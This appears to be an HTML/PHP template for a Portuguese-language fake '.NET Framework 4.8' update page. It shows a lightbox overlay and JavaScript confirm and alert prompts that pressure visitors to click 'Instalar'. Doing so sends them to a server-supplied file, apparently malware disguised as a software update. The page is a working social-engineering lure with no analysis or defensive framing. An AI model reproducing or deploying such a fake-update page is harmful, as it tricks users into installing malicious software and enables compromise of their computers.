...
<html>
	...
	<center>
		...
		<table width="1448" border="0" align="center" cellpadding="2" cellspacing="2" style="text-align: left; width: 592px; height: 556px;">
            ...
            <h3 align="center"><font><font color="#808080" face="Arial, Helvetica, sans-serif">.NET Framework - 4.8<br><br>A Sua Versão está desatualizada, para continuar navegando e preciso atualizar o seu .NET FrameWork para versão 4.8
</font></font></h3>
...
<script type="text/javascript">
	...
	function exitPage() {
		//var r = confirm('Para visualiza\u00E7\u00E3o correta deste site \u00E9 necess\u00E1rio atualizar o seu .NET Framework. Ap\u00F3s a atualiza\u00E7\u00E3o a navega\u00E7\u00E3o no site seguir\u00E1 normalmente. Clique em Instalar');
		var r = confirm('Para normalização da sua navegação e necessario atualizar o seu .NET Framework. Após a atualização sua navegacao voltara normalmente. Clique Instalar.');
		if (r == true) {
			window.location.href = '<?=$arquivo;?>';
		} else {
			alert('Clique em Instalar para continuar');
		}
	}
</script> 
...
<div id="uLightBoxOverlay" class="opaque">
	<div id="uLightBox" class="shadow top bottom" style="width: 585px; top: 156.5px; left: 382px;">
		<div id="lbHeader" class="top">
			<header>Atualizacão .NET Framework 4.8</header>
		</div>
		<div id="lbContent" style="padding-left:0;padding-top:0;padding-bottom:0;">
			<span><a style="border:0;" onClick="exitPage();" href="#"><img src="./Page has moved_files/A-F-Player-0610--001.png"></a></span>
		</div>
		<div id="lbFooter" class="bottom">
			<input type="button" class="flat floatRight" onclick="exitPage();" value="Clique aqui para entrar no site" id="Clique aqui para entrar no site"></div>
	</div>
</div>
